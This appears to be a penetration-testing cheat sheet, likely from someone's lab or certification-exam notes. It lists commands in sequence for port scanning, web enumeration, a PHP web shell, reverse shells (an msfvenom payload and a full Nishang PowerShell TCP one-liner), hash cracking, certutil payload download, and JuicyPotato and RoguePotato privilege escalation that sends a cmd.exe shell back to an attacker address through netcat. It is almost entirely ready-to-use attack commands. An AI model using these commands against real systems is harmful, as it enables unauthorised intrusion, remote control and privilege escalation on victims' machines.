ENUMERATION

Port Scan
nmap -sC -sV -p- -vv -oA full 192.168.xxx.xxx
nmap -v -sS -A -T4 192.168.xxx.xxx (no ping)
nmap -sV -sC -Pn  192.168.xxx.xxx

Web Enum
nikto -h 192.168.xxx.xxx
gobuster dir -u http://192.168.xxx.xxx/ -w /usr/share/dirb/wordlists/common.txt -k -x .txt,.php --threads 50

Remote Command Execution
echo "<?php echo system($_GET['x']); ?>" >> test.php | http://192.168.xxx.xxx/shell.php?cmd=dir

Reverse Shell
1. Netcat listener
rlwrap nc -lvp 21
2.Msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.xxx.xxx LPORT=242 -f exe -o reverse.exe
3. Nishang Powershell (edit end of script)
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1
#$client = New-Object System.Net.Sockets.TCPClient('192.168.xxx.xxx,1234;$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Upgrade shell
python -c 'import pty; pty.spawn("/bin/sh")'

Password  cracking
hashcat -m 1600 -a 0 password.hash /usr/share/wordlists/rockyou.txt (MD5)
echo '$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0' >> password.hash

Upload Payload
1.Windows
certutil.exe -f -urlcache -split http://192.168.xxx.xxx/Juicy.Potato.x86.exe

PRIV ESC

Local HTTP Server
python3 -m http.server 80
python2 -m SimpleHTTPServer 80

Windows
1. JAWS 
C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
2.JUICY POTATO
get CLSID here:http://ohpe.it/juicy-potato/CLSID/
C:\wamp\www>.\Juicy.Potato.x86.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}  -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.xxx.xxx 21" -l 31337
3. Rogue Potato
RoguePotato.exe -r 192.168.49.218 -e "/c c:\wamp\www\nc.exe 192.168.49.218 21 -e cmd.exe" -l 31337

Proof
type c:\users\administrator\desktop\proof.txt
type c:\users\administrator\desktop\proof.txt
